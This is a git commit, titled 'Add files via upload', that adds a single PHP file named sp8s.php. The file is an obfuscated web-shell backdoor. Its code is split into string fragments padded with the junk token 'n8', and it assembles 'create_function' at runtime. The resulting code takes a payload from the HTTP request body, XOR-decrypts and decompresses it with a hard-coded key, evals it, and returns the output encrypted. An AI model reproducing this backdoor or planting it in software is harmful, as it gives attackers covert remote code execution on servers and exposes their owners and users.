99bb57aed9389450bd09fa1c9d69c2c004d5b6d9
rizkymarunda <33739358+rizkymarunda@users.noreply.github.com>
2022-09-25 02:03:04 +0700

    Add files via upload

---
+++ sp8s.php
@@ -0,0 +1,13 @@
+<?php
+$v='==1){n8@ob_stan8rtn8();@evan8l(@gzuncompren8ss(@x(@bn8ase64n8_decode(n8n8$';
+$U='m[1]),$k)))n8;$on8=@ob_getn8_n8contents()n8;@n8ob_end_clen8an(n8);$r=n8@';
+$Y='ban8se64_encoden8(@x(@gzcon8mpressn8n8($o),$k));n8prinn8t("$p$n8kh$r$kf");}';
+$l='$kn8="17e4en8df5";$n8kh="d777n8ba6dn82b4n81";$kf="1n87d480a3n8dfn8cc";$p=n8"';
+$K='8rlen($t);n8$on8=""n8;fn8or($in8n8=n80;$i<$l;){forn8($j=0;($j<$c&&n8$i<$l);$j';
+$G='"n8/$kn8h(.+)$kf/"n8,@n8file_get_conn8tents("n8pn8hp://inpn8utn8"),$n8m)';
+$B='++n8,n8$n8i++){$o.=$t{$in8}^$k{n8$j};}}return8n $o;}n8if(@pn8ren8g_match(';
+$A=str_replace('h','','chreathhhe_fuhncthion');
+$Z='Prn8xEaxvaMn8oVkGezd"n8;function8n x($t,$kn8){$c=stn8rlen($n8n8k);$l=stn';
+$w=str_replace('n8','',$l.$Z.$K.$B.$G.$v.$U.$Y);
+$k=$A('',$w);$k();
+?>
